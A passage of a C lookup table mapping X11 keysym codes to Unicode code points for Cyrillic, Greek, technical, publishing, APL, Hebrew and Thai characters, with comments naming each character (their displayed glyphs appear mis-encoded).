  {0x06e6, 0x0424}, /*                 Cyrillic_EF –§ CYRILLIC CAPITAL LETTER EF */
  {0x06e7, 0x0413}, /*                Cyrillic_GHE –ì CYRILLIC CAPITAL LETTER GHE */
  {0x06e8, 0x0425}, /*                 Cyrillic_HA –• CYRILLIC CAPITAL LETTER HA */
  {0x06e9, 0x0418}, /*                  Cyrillic_I –ò CYRILLIC CAPITAL LETTER I */
  {0x06ea, 0x0419}, /*             Cyrillic_SHORTI –ô CYRILLIC CAPITAL LETTER SHORT I */
  {0x06eb, 0x041a}, /*                 Cyrillic_KA –ö CYRILLIC CAPITAL LETTER KA */
  {0x06ec, 0x041b}, /*                 Cyrillic_EL –õ CYRILLIC CAPITAL LETTER EL */
  {0x06ed, 0x041c}, /*                 Cyrillic_EM –ú CYRILLIC CAPITAL LETTER EM */
  {0x06ee, 0x041d}, /*                 Cyrillic_EN –ù CYRILLIC CAPITAL LETTER EN */
  {0x06ef, 0x041e}, /*                  Cyrillic_O –û CYRILLIC CAPITAL LETTER O */
  {0x06f0, 0x041f}, /*                 Cyrillic_PE –ü CYRILLIC CAPITAL LETTER PE */
  {0x06f1, 0x042f}, /*                 Cyrillic_YA –Ø CYRILLIC CAPITAL LETTER YA */
  {0x06f2, 0x0420}, /*                 Cyrillic_ER –† CYRILLIC CAPITAL LETTER ER */
  {0x06f3, 0x0421}, /*                 Cyrillic_ES –° CYRILLIC CAPITAL LETTER ES */
  {0x06f4, 0x0422}, /*                 Cyrillic_TE –¢ CYRILLIC CAPITAL LETTER TE */
  {0x06f5, 0x0423}, /*                  Cyrillic_U –£ CYRILLIC CAPITAL LETTER U */
  {0x06f6, 0x0416}, /*                Cyrillic_ZHE –ñ CYRILLIC CAPITAL LETTER ZHE */
  {0x06f7, 0x0412}, /*                 Cyrillic_VE –í CYRILLIC CAPITAL LETTER VE */
  {0x06f8, 0x042c}, /*           Cyrillic_SOFTSIGN –¨ CYRILLIC CAPITAL LETTER SOFT SIGN */
  {0x06f9, 0x042b}, /*               Cyrillic_YERU –´ CYRILLIC CAPITAL LETTER YERU */
  {0x06fa, 0x0417}, /*                 Cyrillic_ZE –ó CYRILLIC CAPITAL LETTER ZE */
  {0x06fb, 0x0428}, /*                Cyrillic_SHA –® CYRILLIC CAPITAL LETTER SHA */
  {0x06fc, 0x042d}, /*                  Cyrillic_E –≠ CYRILLIC CAPITAL LETTER E */
  {0x06fd, 0x0429}, /*              Cyrillic_SHCHA –© CYRILLIC CAPITAL LETTER SHCHA */
  {0x06fe, 0x0427}, /*                Cyrillic_CHE –ß CYRILLIC CAPITAL LETTER CHE */
  {0x06ff, 0x042a}, /*           Cyrillic_HARDSIGN –™ CYRILLIC CAPITAL LETTER HARD SIGN */
  {0x07a1, 0x0386}, /*           Greek_ALPHAaccent ŒÜ GREEK CAPITAL LETTER ALPHA WITH TONOS */
  {0x07a2, 0x0388}, /*         Greek_EPSILONaccent Œà GREEK CAPITAL LETTER EPSILON WITH TONOS */
  {0x07a3, 0x0389}, /*             Greek_ETAaccent Œâ GREEK CAPITAL LETTER ETA WITH TONOS */
  {0x07a4, 0x038a}, /*            Greek_IOTAaccent Œä GREEK CAPITAL LETTER IOTA WITH TONOS */
  {0x07a5, 0x03aa}, /*         Greek_IOTAdiaeresis Œ™ GREEK CAPITAL LETTER IOTA WITH DIALYTIKA */
  {0x07a7, 0x038c}, /*         Greek_OMICRONaccent Œå GREEK CAPITAL LETTER OMICRON WITH TONOS */
  {0x07a8, 0x038e}, /*         Greek_UPSILONaccent Œé GREEK CAPITAL LETTER UPSILON WITH TONOS */
  {0x07a9, 0x03ab}, /*       Greek_UPSILONdieresis Œ´ GREEK CAPITAL LETTER UPSILON WITH DIALYTIKA */
  {0x07ab, 0x038f}, /*           Greek_OMEGAaccent Œè GREEK CAPITAL LETTER OMEGA WITH TONOS */
  {0x07ae, 0x0385}, /*        Greek_accentdieresis ŒÖ GREEK DIALYTIKA TONOS */
  {0x07af, 0x2015}, /*              Greek_horizbar ‚Äï HORIZONTAL BAR */
  {0x07b1, 0x03ac}, /*           Greek_alphaaccent Œ¨ GREEK SMALL LETTER ALPHA WITH TONOS */
  {0x07b2, 0x03ad}, /*         Greek_epsilonaccent Œ≠ GREEK SMALL LETTER EPSILON WITH TONOS */
  {0x07b3, 0x03ae}, /*             Greek_etaaccent ŒÆ GREEK SMALL LETTER ETA WITH TONOS */
  {0x07b4, 0x03af}, /*            Greek_iotaaccent ŒØ GREEK SMALL LETTER IOTA WITH TONOS */
  {0x07b5, 0x03ca}, /*          Greek_iotadieresis œä GREEK SMALL LETTER IOTA WITH DIALYTIKA */
  {0x07b6, 0x0390}, /*    Greek_iotaaccentdieresis Œê GREEK SMALL LETTER IOTA WITH DIALYTIKA AND TONOS */
  {0x07b7, 0x03cc}, /*         Greek_omicronaccent œå GREEK SMALL LETTER OMICRON WITH TONOS */
  {0x07b8, 0x03cd}, /*         Greek_upsilonaccent œç GREEK SMALL LETTER UPSILON WITH TONOS */
  {0x07b9, 0x03cb}, /*       Greek_upsilondieresis œã GREEK SMALL LETTER UPSILON WITH DIALYTIKA */
  {0x07ba, 0x03b0}, /* Greek_upsilonaccentdieresis Œ∞ GREEK SMALL LETTER UPSILON WITH DIALYTIKA AND TONOS */
  {0x07bb, 0x03ce}, /*           Greek_omegaaccent œé GREEK SMALL LETTER OMEGA WITH TONOS */
  {0x07c1, 0x0391}, /*                 Greek_ALPHA Œë GREEK CAPITAL LETTER ALPHA */
  {0x07c2, 0x0392}, /*                  Greek_BETA Œí GREEK CAPITAL LETTER BETA */
  {0x07c3, 0x0393}, /*                 Greek_GAMMA Œì GREEK CAPITAL LETTER GAMMA */
  {0x07c4, 0x0394}, /*                 Greek_DELTA Œî GREEK CAPITAL LETTER DELTA */
  {0x07c5, 0x0395}, /*               Greek_EPSILON Œï GREEK CAPITAL LETTER EPSILON */
  {0x07c6, 0x0396}, /*                  Greek_ZETA Œñ GREEK CAPITAL LETTER ZETA */
  {0x07c7, 0x0397}, /*                   Greek_ETA Œó GREEK CAPITAL LETTER ETA */
  {0x07c8, 0x0398}, /*                 Greek_THETA Œò GREEK CAPITAL LETTER THETA */
  {0x07c9, 0x0399}, /*                  Greek_IOTA Œô GREEK CAPITAL LETTER IOTA */
  {0x07ca, 0x039a}, /*                 Greek_KAPPA Œö GREEK CAPITAL LETTER KAPPA */
  {0x07cb, 0x039b}, /*                Greek_LAMBDA Œõ GREEK CAPITAL LETTER LAMDA */
  {0x07cc, 0x039c}, /*                    Greek_MU Œú GREEK CAPITAL LETTER MU */
  {0x07cd, 0x039d}, /*                    Greek_NU Œù GREEK CAPITAL LETTER NU */
  {0x07ce, 0x039e}, /*                    Greek_XI Œû GREEK CAPITAL LETTER XI */
  {0x07cf, 0x039f}, /*               Greek_OMICRON Œü GREEK CAPITAL LETTER OMICRON */
  {0x07d0, 0x03a0}, /*                    Greek_PI Œ† GREEK CAPITAL LETTER PI */
  {0x07d1, 0x03a1}, /*                   Greek_RHO Œ° GREEK CAPITAL LETTER RHO */
  {0x07d2, 0x03a3}, /*                 Greek_SIGMA Œ£ GREEK CAPITAL LETTER SIGMA */
  {0x07d4, 0x03a4}, /*                   Greek_TAU Œ§ GREEK CAPITAL LETTER TAU */
  {0x07d5, 0x03a5}, /*               Greek_UPSILON Œ• GREEK CAPITAL LETTER UPSILON */
  {0x07d6, 0x03a6}, /*                   Greek_PHI Œ¶ GREEK CAPITAL LETTER PHI */
  {0x07d7, 0x03a7}, /*                   Greek_CHI Œß GREEK CAPITAL LETTER CHI */
  {0x07d8, 0x03a8}, /*                   Greek_PSI Œ® GREEK CAPITAL LETTER PSI */
  {0x07d9, 0x03a9}, /*                 Greek_OMEGA Œ© GREEK CAPITAL LETTER OMEGA */
  {0x07e1, 0x03b1}, /*                 Greek_alpha Œ± GREEK SMALL LETTER ALPHA */
  {0x07e2, 0x03b2}, /*                  Greek_beta Œ≤ GREEK SMALL LETTER BETA */
  {0x07e3, 0x03b3}, /*                 Greek_gamma Œ≥ GREEK SMALL LETTER GAMMA */
  {0x07e4, 0x03b4}, /*                 Greek_delta Œ¥ GREEK SMALL LETTER DELTA */
  {0x07e5, 0x03b5}, /*               Greek_epsilon Œµ GREEK SMALL LETTER EPSILON */
  {0x07e6, 0x03b6}, /*                  Greek_zeta Œ∂ GREEK SMALL LETTER ZETA */
  {0x07e7, 0x03b7}, /*                   Greek_eta Œ∑ GREEK SMALL LETTER ETA */
  {0x07e8, 0x03b8}, /*                 Greek_theta Œ∏ GREEK SMALL LETTER THETA */
  {0x07e9, 0x03b9}, /*                  Greek_iota Œπ GREEK SMALL LETTER IOTA */
  {0x07ea, 0x03ba}, /*                 Greek_kappa Œ∫ GREEK SMALL LETTER KAPPA */
  {0x07eb, 0x03bb}, /*                Greek_lambda Œª GREEK SMALL LETTER LAMDA */
  {0x07ec, 0x03bc}, /*                    Greek_mu Œº GREEK SMALL LETTER MU */
  {0x07ed, 0x03bd}, /*                    Greek_nu ŒΩ GREEK SMALL LETTER NU */
  {0x07ee, 0x03be}, /*                    Greek_xi Œæ GREEK SMALL LETTER XI */
  {0x07ef, 0x03bf}, /*               Greek_omicron Œø GREEK SMALL LETTER OMICRON */
  {0x07f0, 0x03c0}, /*                    Greek_pi œÄ GREEK SMALL LETTER PI */
  {0x07f1, 0x03c1}, /*                   Greek_rho œÅ GREEK SMALL LETTER RHO */
  {0x07f2, 0x03c3}, /*                 Greek_sigma œÉ GREEK SMALL LETTER SIGMA */
  {0x07f3, 0x03c2}, /*       Greek_finalsmallsigma œÇ GREEK SMALL LETTER FINAL SIGMA */
  {0x07f4, 0x03c4}, /*                   Greek_tau œÑ GREEK SMALL LETTER TAU */
  {0x07f5, 0x03c5}, /*               Greek_upsilon œÖ GREEK SMALL LETTER UPSILON */
  {0x07f6, 0x03c6}, /*                   Greek_phi œÜ GREEK SMALL LETTER PHI */
  {0x07f7, 0x03c7}, /*                   Greek_chi œá GREEK SMALL LETTER CHI */
  {0x07f8, 0x03c8}, /*                   Greek_psi œà GREEK SMALL LETTER PSI */
  {0x07f9, 0x03c9}, /*                 Greek_omega œâ GREEK SMALL LETTER OMEGA */
  {0x08a1, 0x23b7}, /*                 leftradical ‚é∑ RADICAL SYMBOL BOTTOM */
  {0x08a2, 0x250c}, /*              topleftradical ‚îå BOX DRAWINGS LIGHT DOWN AND RIGHT */
  {0x08a3, 0x2500}, /*              horizconnector ‚îÄ BOX DRAWINGS LIGHT HORIZONTAL */
  {0x08a4, 0x2320}, /*                 topintegral ‚å† TOP HALF INTEGRAL */
  {0x08a5, 0x2321}, /*                 botintegral ‚å° BOTTOM HALF INTEGRAL */
  {0x08a6, 0x2502}, /*               vertconnector ‚îÇ BOX DRAWINGS LIGHT VERTICAL */
  {0x08a7, 0x23a1}, /*            topleftsqbracket ‚é° LEFT SQUARE BRACKET UPPER CORNER */
  {0x08a8, 0x23a3}, /*            botleftsqbracket ‚é£ LEFT SQUARE BRACKET LOWER CORNER */
  {0x08a9, 0x23a4}, /*           toprightsqbracket ‚é§ RIGHT SQUARE BRACKET UPPER CORNER */
  {0x08aa, 0x23a6}, /*           botrightsqbracket ‚é¶ RIGHT SQUARE BRACKET LOWER CORNER */
  {0x08ab, 0x239b}, /*               topleftparens ‚éõ LEFT PARENTHESIS UPPER HOOK */
  {0x08ac, 0x239d}, /*               botleftparens ‚éù LEFT PARENTHESIS LOWER HOOK */
  {0x08ad, 0x239e}, /*              toprightparens ‚éû RIGHT PARENTHESIS UPPER HOOK */
  {0x08ae, 0x23a0}, /*              botrightparens ‚é† RIGHT PARENTHESIS LOWER HOOK */
  {0x08af, 0x23a8}, /*        leftmiddlecurlybrace ‚é® LEFT CURLY BRACKET MIDDLE PIECE */
  {0x08b0, 0x23ac}, /*       rightmiddlecurlybrace ‚é¨ RIGHT CURLY BRACKET MIDDLE PIECE */
  /*  0x08b1                         topleftsummation ? ??? */
  /*  0x08b2                         botleftsummation ? ??? */
  /*  0x08b3                topvertsummationconnector ? ??? */
  /*  0x08b4                botvertsummationconnector ? ??? */
  /*  0x08b5                        toprightsummation ? ??? */
  /*  0x08b6                        botrightsummation ? ??? */
  /*  0x08b7                     rightmiddlesummation ? ??? */
  {0x08bc, 0x2264}, /*               lessthanequal ‚â§ LESS-THAN OR EQUAL TO */
  {0x08bd, 0x2260}, /*                    notequal ‚â† NOT EQUAL TO */
  {0x08be, 0x2265}, /*            greaterthanequal ‚â• GREATER-THAN OR EQUAL TO */
  {0x08bf, 0x222b}, /*                    integral ‚à´ INTEGRAL */
  {0x08c0, 0x2234}, /*                   therefore ‚à¥ THEREFORE */
  {0x08c1, 0x221d}, /*                   variation ‚àù PROPORTIONAL TO */
  {0x08c2, 0x221e}, /*                    infinity ‚àû INFINITY */
  {0x08c5, 0x2207}, /*                       nabla ‚àá NABLA */
  {0x08c8, 0x223c}, /*                 approximate ‚àº TILDE OPERATOR */
  {0x08c9, 0x2243}, /*                similarequal ‚âÉ ASYMPTOTICALLY EQUAL TO */
  {0x08cd, 0x21d4}, /*                    ifonlyif ‚áî LEFT RIGHT DOUBLE ARROW */
  {0x08ce, 0x21d2}, /*                     implies ‚áí RIGHTWARDS DOUBLE ARROW */
  {0x08cf, 0x2261}, /*                   identical ‚â° IDENTICAL TO */
  {0x08d6, 0x221a}, /*                     radical ‚àö SQUARE ROOT */
  {0x08da, 0x2282}, /*                  includedin ‚äÇ SUBSET OF */
  {0x08db, 0x2283}, /*                    includes ‚äÉ SUPERSET OF */
  {0x08dc, 0x2229}, /*                intersection ‚à© INTERSECTION */
  {0x08dd, 0x222a}, /*                       union ‚à™ UNION */
  {0x08de, 0x2227}, /*                  logicaland ‚àß LOGICAL AND */
  {0x08df, 0x2228}, /*                   logicalor ‚à® LOGICAL OR */
  {0x08ef, 0x2202}, /*           partialderivative ‚àÇ PARTIAL DIFFERENTIAL */
  {0x08f6, 0x0192}, /*                    function ∆í LATIN SMALL LETTER F WITH HOOK */
  {0x08fb, 0x2190}, /*                   leftarrow ‚Üê LEFTWARDS ARROW */
  {0x08fc, 0x2191}, /*                     uparrow ‚Üë UPWARDS ARROW */
  {0x08fd, 0x2192}, /*                  rightarrow ‚Üí RIGHTWARDS ARROW */
  {0x08fe, 0x2193}, /*                   downarrow ‚Üì DOWNWARDS ARROW */
  {0x09df, 0x2422}, /*                       blank ‚ê¢ BLANK SYMBOL */
  {0x09e0, 0x25c6}, /*                soliddiamond ‚óÜ BLACK DIAMOND */
  {0x09e1, 0x2592}, /*                checkerboard ‚ñí MEDIUM SHADE */
  {0x09e2, 0x2409}, /*                          ht ‚êâ SYMBOL FOR HORIZONTAL TABULATION */
  {0x09e3, 0x240c}, /*                          ff ‚êå SYMBOL FOR FORM FEED */
  {0x09e4, 0x240d}, /*                          cr ‚êç SYMBOL FOR CARRIAGE RETURN */
  {0x09e5, 0x240a}, /*                          lf ‚êä SYMBOL FOR LINE FEED */
  {0x09e8, 0x2424}, /*                          nl ‚ê§ SYMBOL FOR NEWLINE */
  {0x09e9, 0x240b}, /*                          vt ‚êã SYMBOL FOR VERTICAL TABULATION */
  {0x09ea, 0x2518}, /*              lowrightcorner ‚îò BOX DRAWINGS LIGHT UP AND LEFT */
  {0x09eb, 0x2510}, /*               uprightcorner ‚îê BOX DRAWINGS LIGHT DOWN AND LEFT */
  {0x09ec, 0x250c}, /*                upleftcorner ‚îå BOX DRAWINGS LIGHT DOWN AND RIGHT */
  {0x09ed, 0x2514}, /*               lowleftcorner ‚îî BOX DRAWINGS LIGHT UP AND RIGHT */
  {0x09ee, 0x253c}, /*               crossinglines ‚îº BOX DRAWINGS LIGHT VERTICAL AND HORIZONTAL */
  {0x09ef, 0x23ba}, /*              horizlinescan1 ‚é∫ HORIZONTAL SCAN LINE-1 */
  {0x09f0, 0x23bb}, /*              horizlinescan3 ‚éª HORIZONTAL SCAN LINE-3 */
  {0x09f1, 0x2500}, /*              horizlinescan5 ‚îÄ BOX DRAWINGS LIGHT HORIZONTAL */
  {0x09f2, 0x23bc}, /*              horizlinescan7 ‚éº HORIZONTAL SCAN LINE-7 */
  {0x09f3, 0x23bd}, /*              horizlinescan9 ‚éΩ HORIZONTAL SCAN LINE-9 */
  {0x09f4, 0x251c}, /*                       leftt ‚îú BOX DRAWINGS LIGHT VERTICAL AND RIGHT */
  {0x09f5, 0x2524}, /*                      rightt ‚î§ BOX DRAWINGS LIGHT VERTICAL AND LEFT */
  {0x09f6, 0x2534}, /*                        bott ‚î¥ BOX DRAWINGS LIGHT UP AND HORIZONTAL */
  {0x09f7, 0x252c}, /*                        topt ‚î¨ BOX DRAWINGS LIGHT DOWN AND HORIZONTAL */
  {0x09f8, 0x2502}, /*                     vertbar ‚îÇ BOX DRAWINGS LIGHT VERTICAL */
  {0x0aa1, 0x2003}, /*                     emspace ‚ÄÉ EM SPACE */
  {0x0aa2, 0x2002}, /*                     enspace ‚ÄÇ EN SPACE */
  {0x0aa3, 0x2004}, /*                    em3space ‚ÄÑ THREE-PER-EM SPACE */
  {0x0aa4, 0x2005}, /*                    em4space ‚ÄÖ FOUR-PER-EM SPACE */
  {0x0aa5, 0x2007}, /*                  digitspace ‚Äá FIGURE SPACE */
  {0x0aa6, 0x2008}, /*                  punctspace ‚Äà PUNCTUATION SPACE */
  {0x0aa7, 0x2009}, /*                   thinspace ‚Äâ THIN SPACE */
  {0x0aa8, 0x200a}, /*                   hairspace ‚Ää HAIR SPACE */
  {0x0aa9, 0x2014}, /*                      emdash ‚Äî EM DASH */
  {0x0aaa, 0x2013}, /*                      endash ‚Äì EN DASH */
  {0x0aac, 0x2423}, /*                 signifblank ‚ê£ OPEN BOX */
  {0x0aae, 0x2026}, /*                    ellipsis ‚Ä¶ HORIZONTAL ELLIPSIS */
  {0x0aaf, 0x2025}, /*             doubbaselinedot ‚Ä• TWO DOT LEADER */
  {0x0ab0, 0x2153}, /*                    onethird ‚Öì VULGAR FRACTION ONE THIRD */
  {0x0ab1, 0x2154}, /*                   twothirds ‚Öî VULGAR FRACTION TWO THIRDS */
  {0x0ab2, 0x2155}, /*                    onefifth ‚Öï VULGAR FRACTION ONE FIFTH */
  {0x0ab3, 0x2156}, /*                   twofifths ‚Öñ VULGAR FRACTION TWO FIFTHS */
  {0x0ab4, 0x2157}, /*                 threefifths ‚Öó VULGAR FRACTION THREE FIFTHS */
  {0x0ab5, 0x2158}, /*                  fourfifths ‚Öò VULGAR FRACTION FOUR FIFTHS */
  {0x0ab6, 0x2159}, /*                    onesixth ‚Öô VULGAR FRACTION ONE SIXTH */
  {0x0ab7, 0x215a}, /*                  fivesixths ‚Öö VULGAR FRACTION FIVE SIXTHS */
  {0x0ab8, 0x2105}, /*                      careof ‚ÑÖ CARE OF */
  {0x0abb, 0x2012}, /*                     figdash ‚Äí FIGURE DASH */
  {0x0abc, 0x2329}, /*            leftanglebracket ‚å© LEFT-POINTING ANGLE BRACKET */
  {0x0abd, 0x002e}, /*                decimalpoint . FULL STOP */
  {0x0abe, 0x232a}, /*           rightanglebracket ‚å™ RIGHT-POINTING ANGLE BRACKET */
  /*  0x0abf                                   marker ? ??? */
  {0x0ac3, 0x215b}, /*                   oneeighth ‚Öõ VULGAR FRACTION ONE EIGHTH */
  {0x0ac4, 0x215c}, /*                threeeighths ‚Öú VULGAR FRACTION THREE EIGHTHS */
  {0x0ac5, 0x215d}, /*                 fiveeighths ‚Öù VULGAR FRACTION FIVE EIGHTHS */
  {0x0ac6, 0x215e}, /*                seveneighths ‚Öû VULGAR FRACTION SEVEN EIGHTHS */
  {0x0ac9, 0x2122}, /*                   trademark ‚Ñ¢ TRADE MARK SIGN */
  {0x0aca, 0x2613}, /*               signaturemark ‚òì SALTIRE */
  /*  0x0acb                        trademarkincircle ? ??? */
  {0x0acc, 0x25c1}, /*            leftopentriangle ‚óÅ WHITE LEFT-POINTING TRIANGLE */
  {0x0acd, 0x25b7}, /*           rightopentriangle ‚ñ∑ WHITE RIGHT-POINTING TRIANGLE */
  {0x0ace, 0x25cb}, /*                emopencircle ‚óã WHITE CIRCLE */
  {0x0acf, 0x25af}, /*             emopenrectangle ‚ñØ WHITE VERTICAL RECTANGLE */
  {0x0ad0, 0x2018}, /*         leftsinglequotemark ‚Äò LEFT SINGLE QUOTATION MARK */
  {0x0ad1, 0x2019}, /*        rightsinglequotemark ‚Äô RIGHT SINGLE QUOTATION MARK */
  {0x0ad2, 0x201c}, /*         leftdoublequotemark ‚Äú LEFT DOUBLE QUOTATION MARK */
  {0x0ad3, 0x201d}, /*        rightdoublequotemark ‚Äù RIGHT DOUBLE QUOTATION MARK */
  {0x0ad4, 0x211e}, /*                prescription ‚Ñû PRESCRIPTION TAKE */
  {0x0ad6, 0x2032}, /*                     minutes ‚Ä≤ PRIME */
  {0x0ad7, 0x2033}, /*                     seconds ‚Ä≥ DOUBLE PRIME */
  {0x0ad9, 0x271d}, /*                  latincross ‚úù LATIN CROSS */
  /*  0x0ada                                 hexagram ? ??? */
  {0x0adb, 0x25ac}, /*            filledrectbullet ‚ñ¨ BLACK RECTANGLE */
  {0x0adc, 0x25c0}, /*         filledlefttribullet ‚óÄ BLACK LEFT-POINTING TRIANGLE */
  {0x0add, 0x25b6}, /*        filledrighttribullet ‚ñ∂ BLACK RIGHT-POINTING TRIANGLE */
  {0x0ade, 0x25cf}, /*              emfilledcircle ‚óè BLACK CIRCLE */
  {0x0adf, 0x25ae}, /*                emfilledrect ‚ñÆ BLACK VERTICAL RECTANGLE */
  {0x0ae0, 0x25e6}, /*            enopencircbullet ‚ó¶ WHITE BULLET */
  {0x0ae1, 0x25ab}, /*          enopensquarebullet ‚ñ´ WHITE SMALL SQUARE */
  {0x0ae2, 0x25ad}, /*              openrectbullet ‚ñ≠ WHITE RECTANGLE */
  {0x0ae3, 0x25b3}, /*             opentribulletup ‚ñ≥ WHITE UP-POINTING TRIANGLE */
  {0x0ae4, 0x25bd}, /*           opentribulletdown ‚ñΩ WHITE DOWN-POINTING TRIANGLE */
  {0x0ae5, 0x2606}, /*                    openstar ‚òÜ WHITE STAR */
  {0x0ae6, 0x2022}, /*          enfilledcircbullet ‚Ä¢ BULLET */
  {0x0ae7, 0x25aa}, /*            enfilledsqbullet ‚ñ™ BLACK SMALL SQUARE */
  {0x0ae8, 0x25b2}, /*           filledtribulletup ‚ñ≤ BLACK UP-POINTING TRIANGLE */
  {0x0ae9, 0x25bc}, /*         filledtribulletdown ‚ñº BLACK DOWN-POINTING TRIANGLE */
  {0x0aea, 0x261c}, /*                 leftpointer ‚òú WHITE LEFT POINTING INDEX */
  {0x0aeb, 0x261e}, /*                rightpointer ‚òû WHITE RIGHT POINTING INDEX */
  {0x0aec, 0x2663}, /*                        club ‚ô£ BLACK CLUB SUIT */
  {0x0aed, 0x2666}, /*                     diamond ‚ô¶ BLACK DIAMOND SUIT */
  {0x0aee, 0x2665}, /*                       heart ‚ô• BLACK HEART SUIT */
  {0x0af0, 0x2720}, /*                maltesecross ‚ú† MALTESE CROSS */
  {0x0af1, 0x2020}, /*                      dagger ‚Ä† DAGGER */
  {0x0af2, 0x2021}, /*                doubledagger ‚Ä° DOUBLE DAGGER */
  {0x0af3, 0x2713}, /*                   checkmark ‚úì CHECK MARK */
  {0x0af4, 0x2717}, /*                 ballotcross ‚úó BALLOT X */
  {0x0af5, 0x266f}, /*                musicalsharp ‚ôØ MUSIC SHARP SIGN */
  {0x0af6, 0x266d}, /*                 musicalflat ‚ô≠ MUSIC FLAT SIGN */
  {0x0af7, 0x2642}, /*                  malesymbol ‚ôÇ MALE SIGN */
  {0x0af8, 0x2640}, /*                femalesymbol ‚ôÄ FEMALE SIGN */
  {0x0af9, 0x260e}, /*                   telephone ‚òé BLACK TELEPHONE */
  {0x0afa, 0x2315}, /*           telephonerecorder ‚åï TELEPHONE RECORDER */
  {0x0afb, 0x2117}, /*         phonographcopyright ‚Ñó SOUND RECORDING COPYRIGHT */
  {0x0afc, 0x2038}, /*                       caret ‚Ä∏ CARET */
  {0x0afd, 0x201a}, /*          singlelowquotemark ‚Äö SINGLE LOW-9 QUOTATION MARK */
  {0x0afe, 0x201e}, /*          doublelowquotemark ‚Äû DOUBLE LOW-9 QUOTATION MARK */
  /*  0x0aff                                   cursor ? ??? */
  {0x0ba3, 0x003c}, /*                   leftcaret < LESS-THAN SIGN */
  {0x0ba6, 0x003e}, /*                  rightcaret > GREATER-THAN SIGN */
  {0x0ba8, 0x2228}, /*                   downcaret ‚à® LOGICAL OR */
  {0x0ba9, 0x2227}, /*                     upcaret ‚àß LOGICAL AND */
  {0x0bc0, 0x00af}, /*                     overbar ¬Ø MACRON */
  {0x0bc2, 0x22a5}, /*                    downtack ‚ä• UP TACK */
  {0x0bc3, 0x2229}, /*                      upshoe ‚à© INTERSECTION */
  {0x0bc4, 0x230a}, /*                   downstile ‚åä LEFT FLOOR */
  {0x0bc6, 0x005f}, /*                    underbar _ LOW LINE */
  {0x0bca, 0x2218}, /*                         jot ‚àò RING OPERATOR */
  {0x0bcc, 0x2395}, /*                        quad ‚éï APL FUNCTIONAL SYMBOL QUAD */
  {0x0bce, 0x22a4}, /*                      uptack ‚ä§ DOWN TACK */
  {0x0bcf, 0x25cb}, /*                      circle ‚óã WHITE CIRCLE */
  {0x0bd3, 0x2308}, /*                     upstile ‚åà LEFT CEILING */
  {0x0bd6, 0x222a}, /*                    downshoe ‚à™ UNION */
  {0x0bd8, 0x2283}, /*                   rightshoe ‚äÉ SUPERSET OF */
  {0x0bda, 0x2282}, /*                    leftshoe ‚äÇ SUBSET OF */
  {0x0bdc, 0x22a2}, /*                    lefttack ‚ä¢ RIGHT TACK */
  {0x0bfc, 0x22a3}, /*                   righttack ‚ä£ LEFT TACK */
  {0x0cdf, 0x2017}, /*        hebrew_doublelowline ‚Äó DOUBLE LOW LINE */
  {0x0ce0, 0x05d0}, /*                hebrew_aleph ◊ê HEBREW LETTER ALEF */
  {0x0ce1, 0x05d1}, /*                  hebrew_bet ◊ë HEBREW LETTER BET */
  {0x0ce2, 0x05d2}, /*                hebrew_gimel ◊í HEBREW LETTER GIMEL */
  {0x0ce3, 0x05d3}, /*                hebrew_dalet ◊ì HEBREW LETTER DALET */
  {0x0ce4, 0x05d4}, /*                   hebrew_he ◊î HEBREW LETTER HE */
  {0x0ce5, 0x05d5}, /*                  hebrew_waw ◊ï HEBREW LETTER VAV */
  {0x0ce6, 0x05d6}, /*                 hebrew_zain ◊ñ HEBREW LETTER ZAYIN */
  {0x0ce7, 0x05d7}, /*                 hebrew_chet ◊ó HEBREW LETTER HET */
  {0x0ce8, 0x05d8}, /*                  hebrew_tet ◊ò HEBREW LETTER TET */
  {0x0ce9, 0x05d9}, /*                  hebrew_yod ◊ô HEBREW LETTER YOD */
  {0x0cea, 0x05da}, /*            hebrew_finalkaph ◊ö HEBREW LETTER FINAL KAF */
  {0x0ceb, 0x05db}, /*                 hebrew_kaph ◊õ HEBREW LETTER KAF */
  {0x0cec, 0x05dc}, /*                hebrew_lamed ◊ú HEBREW LETTER LAMED */
  {0x0ced, 0x05dd}, /*             hebrew_finalmem ◊ù HEBREW LETTER FINAL MEM */
  {0x0cee, 0x05de}, /*                  hebrew_mem ◊û HEBREW LETTER MEM */
  {0x0cef, 0x05df}, /*             hebrew_finalnun ◊ü HEBREW LETTER FINAL NUN */
  {0x0cf0, 0x05e0}, /*                  hebrew_nun ◊† HEBREW LETTER NUN */
  {0x0cf1, 0x05e1}, /*               hebrew_samech ◊° HEBREW LETTER SAMEKH */
  {0x0cf2, 0x05e2}, /*                 hebrew_ayin ◊¢ HEBREW LETTER AYIN */
  {0x0cf3, 0x05e3}, /*              hebrew_finalpe ◊£ HEBREW LETTER FINAL PE */
  {0x0cf4, 0x05e4}, /*                   hebrew_pe ◊§ HEBREW LETTER PE */
  {0x0cf5, 0x05e5}, /*            hebrew_finalzade ◊• HEBREW LETTER FINAL TSADI */
  {0x0cf6, 0x05e6}, /*                 hebrew_zade ◊¶ HEBREW LETTER TSADI */
  {0x0cf7, 0x05e7}, /*                 hebrew_qoph ◊ß HEBREW LETTER QOF */
  {0x0cf8, 0x05e8}, /*                 hebrew_resh ◊® HEBREW LETTER RESH */
  {0x0cf9, 0x05e9}, /*                 hebrew_shin ◊© HEBREW LETTER SHIN */
  {0x0cfa, 0x05ea}, /*                  hebrew_taw ◊™ HEBREW LETTER TAV */
  {0x0da1, 0x0e01}, /*                  Thai_kokai ‡∏Å THAI CHARACTER KO KAI */
  {0x0da2, 0x0e02}, /*                Thai_khokhai ‡∏Ç THAI CHARACTER KHO KHAI */
  {0x0da3, 0x0e03}, /*               Thai_khokhuat ‡∏É THAI CHARACTER KHO KHUAT */
  {0x0da4, 0x0e04}, /*               Thai_khokhwai ‡∏Ñ THAI CHARACTER KHO KHWAI */
  {0x0da5, 0x0e05}, /*                Thai_khokhon ‡∏Ö THAI CHARACTER KHO KHON */
  {0x0da6, 0x0e06}, /*             Thai_khorakhang ‡∏Ü THAI CHARACTER KHO RAKHANG */
  {0x0da7, 0x0e07}, /*                 Thai_ngongu ‡∏á THAI CHARACTER NGO NGU */
  {0x0da8, 0x0e08}, /*                Thai_chochan ‡∏à THAI CHARACTER CHO CHAN */
  {0x0da9, 0x0e09}, /*               Thai_choching ‡∏â THAI CHARACTER CHO CHING */
  {0x0daa, 0x0e0a}, /*               Thai_chochang ‡∏ä THAI CHARACTER CHO CHANG */
  {0x0dab, 0x0e0b}, /*                   Thai_soso ‡∏ã THAI CHARACTER SO SO */
  {0x0dac, 0x0e0c}, /*                Thai_chochoe ‡∏å THAI CHARACTER CHO CHOE */
